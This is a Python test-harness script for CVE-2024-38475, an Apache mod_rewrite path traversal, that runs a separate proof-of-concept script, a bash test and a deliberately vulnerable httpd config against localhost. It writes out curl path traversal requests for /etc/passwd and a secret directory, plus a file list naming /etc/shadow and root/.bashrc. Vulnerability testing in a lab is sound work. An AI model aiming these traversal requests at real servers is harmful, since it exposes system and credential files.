#!/usr/bin/env python3
"""
CVE-2024-38475 Complete Test Suite
Comprehensive testing script that combines all vulnerability testing methods
"""

import subprocess
import sys
import os
import time
import json
from datetime import datetime

class CVE2024_38475_TestSuite:
    def __init__(self):
        self.results = {
            'timestamp': datetime.now().isoformat(),
            'cve': 'CVE-2024-38475',
            'target': 'http://localhost',
            'tests': []
        }
    
    def print_header(self):
        print("=" * 80)
        print("CVE-2024-38475 Complete Test Suite")
        print("Apache mod_rewrite Path Traversal Vulnerability")
        print("=" * 80)
        print()
    
    def check_dependencies(self):
        """Check if all required files and dependencies exist"""
        print("Checking dependencies...")
        
        required_files = [
            'cve-2024-38475-poc.py',
            'test-cve-2024-38475.sh',
            'vulnerable-httpd-2.4.59.conf',
            'requirements.txt'
        ]
        
        missing_files = []
        for file in required_files:
            if not os.path.exists(file):
                missing_files.append(file)
            else:
                print(f"✓ Found: {file}")
        
        if missing_files:
            print(f"\n❌ Missing files: {', '.join(missing_files)}")
            return False
        
        # Check Python dependencies
        try:
            import requests
            import colorama
            print("✓ Python dependencies available")
        except ImportError as e:
            print(f"❌ Missing Python dependency: {e}")
            print("Run: pip3 install -r requirements.txt")
            return False
        
        print("✓ All dependencies satisfied\n")
        return True
    
    def run_command(self, cmd, description, timeout=30):
        """Run a command and capture results"""
        print(f"Running: {description}")
        print(f"Command: {cmd}")
        print("-" * 50)
        
        start_time = time.time()
        
        try:
            result = subprocess.run(
                cmd, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=timeout
            )
            
            execution_time = time.time() - start_time
            
            test_result = {
                'description': description,
                'command': cmd,
                'exit_code': result.returncode,
                'execution_time': execution_time,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'success': result.returncode == 0
            }
            
            self.results['tests'].append(test_result)
            
            if result.stdout:
                print("STDOUT:")
                print(result.stdout)
            
            if result.stderr:
                print("STDERR:")
                print(result.stderr)
            
            print(f"Exit code: {result.returncode}")
            print(f"Execution time: {execution_time:.2f} seconds")
            
            return result.returncode == 0
            
        except subprocess.TimeoutExpired:
            print(f"❌ Command timed out after {timeout} seconds")
            return False
        except Exception as e:
            print(f"❌ Error running command: {e}")
            return False
        finally:
            print()
    
    def test_bash_script(self):
        """Test the bash vulnerability test script"""
        print("=" * 60)
        print("TEST 1: Bash Script Vulnerability Test")
        print("=" * 60)
        
        # Make script executable
        os.chmod('test-cve-2024-38475.sh', 0o755)
        
        return self.run_command(
            './test-cve-2024-38475.sh',
            'Bash script vulnerability test'
        )
    
    def test_python_poc_basic(self):
        """Test basic Python PoC"""
        print("=" * 60)
        print("TEST 2: Python PoC Basic Test")
        print("=" * 60)
        
        return self.run_command(
            'python3 cve-2024-38475-poc.py -u http://localhost',
            'Python PoC basic vulnerability test'
        )
    
    def test_python_poc_verbose(self):
        """Test Python PoC with verbose output"""
        print("=" * 60)
        print("TEST 3: Python PoC Verbose Test")
        print("=" * 60)
        
        return self.run_command(
            'python3 cve-2024-38475-poc.py -u http://localhost -v',
            'Python PoC verbose vulnerability test'
        )
    
    def test_python_poc_custom_files(self):
        """Test Python PoC with custom target files"""
        print("=" * 60)
        print("TEST 4: Python PoC Custom Files Test")
        print("=" * 60)
        
        custom_files = 'etc/passwd,etc/shadow,root/.bashrc,usr/local/apache2/conf/httpd.conf'
        
        return self.run_command(
            f'python3 cve-2024-38475-poc.py -u http://localhost -f {custom_files}',
            'Python PoC custom files test'
        )
    
    def test_python_poc_report(self):
        """Test Python PoC report generation"""
        print("=" * 60)
        print("TEST 5: Python PoC Report Generation")
        print("=" * 60)
        
        report_file = f'vulnerability_report_{int(time.time())}.txt'
        
        success = self.run_command(
            f'python3 cve-2024-38475-poc.py -u http://localhost -o {report_file}',
            'Python PoC report generation test'
        )
        
        # Check if report was created
        if os.path.exists(report_file):
            print(f"✓ Report file created: {report_file}")
            with open(report_file, 'r') as f:
                content = f.read()
                print(f"Report size: {len(content)} bytes")
        else:
            print(f"❌ Report file not created: {report_file}")
            success = False
        
        return success
    
    def test_curl_manual(self):
        """Test manual curl commands"""
        print("=" * 60)
        print("TEST 6: Manual cURL Tests")
        print("=" * 60)
        
        curl_tests = [
            {
                'cmd': 'curl -s -o /dev/null -w "%{http_code}" http://localhost/files/../../etc/passwd',
                'desc': 'Path traversal to /etc/passwd'
            },
            {
                'cmd': 'curl -s -o /dev/null -w "%{http_code}" http://localhost/files/../secret/confidential.txt',
                'desc': 'Access to secret directory'
            },
            {
                'cmd': 'curl -s -o /dev/null -w "%{http_code}" "http://localhost/redirect?path=../etc/passwd"',
                'desc': 'Query parameter injection'
            }
        ]
        
        all_success = True
        for test in curl_tests:
            success = self.run_command(test['cmd'], test['desc'], timeout=10)
            all_success = all_success and success
        
        return all_success
    
    def generate_summary_report(self):
        """Generate a comprehensive summary report"""
        report_file = f'test_suite_summary_{int(time.time())}.json'
        
        # Calculate summary statistics
        total_tests = len(self.results['tests'])
        successful_tests = sum(1 for test in self.results['tests'] if test['success'])
        failed_tests = total_tests - successful_tests
        
        self.results['summary'] = {
            'total_tests': total_tests,
            'successful_tests': successful_tests,
            'failed_tests': failed_tests,
            'success_rate': (successful_tests / total_tests * 100) if total_tests > 0 else 0
        }
        
        # Save JSON report
        with open(report_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        # Print summary
        print("=" * 80)
        print("TEST SUITE SUMMARY")
        print("=" * 80)
        print(f"Total tests run: {total_tests}")
        print(f"Successful tests: {successful_tests}")
        print(f"Failed tests: {failed_tests}")
        print(f"Success rate: {self.results['summary']['success_rate']:.1f}%")
        print(f"Detailed report saved to: {report_file}")
        print()
        
        if failed_tests > 0:
            print("Failed tests:")
            for test in self.results['tests']:
                if not test['success']:
                    print(f"  ❌ {test['description']}")
        else:
            print("✓ All tests completed successfully!")
        
        return report_file
    
    def run_all_tests(self):
        """Run all vulnerability tests"""
        self.print_header()
        
        if not self.check_dependencies():
            print("❌ Dependency check failed. Please install missing dependencies.")
            return False
        
        print("Starting comprehensive vulnerability test suite...")
        print()
        
        # Run all tests
        tests = [
            self.test_bash_script,
            self.test_python_poc_basic,
            self.test_python_poc_verbose,
            self.test_python_poc_custom_files,
            self.test_python_poc_report,
            self.test_curl_manual
        ]
        
        for i, test in enumerate(tests, 1):
            print(f"Starting test {i}/{len(tests)}...")
            try:
                test()
            except Exception as e:
                print(f"❌ Test failed with exception: {e}")
            
            if i < len(tests):
                print("Waiting 2 seconds before next test...")
                time.sleep(2)
        
        # Generate summary
        report_file = self.generate_summary_report()
        
        print("=" * 80)
        print("Test suite completed!")
        print(f"Summary report: {report_file}")
        print("=" * 80)
        
        return True

def main():
    """Main function"""
    test_suite = CVE2024_38475_TestSuite()
    
    try:
        test_suite.run_all_tests()
    except KeyboardInterrupt:
        print("\n\n❌ Test suite interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n\n❌ Test suite failed with error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()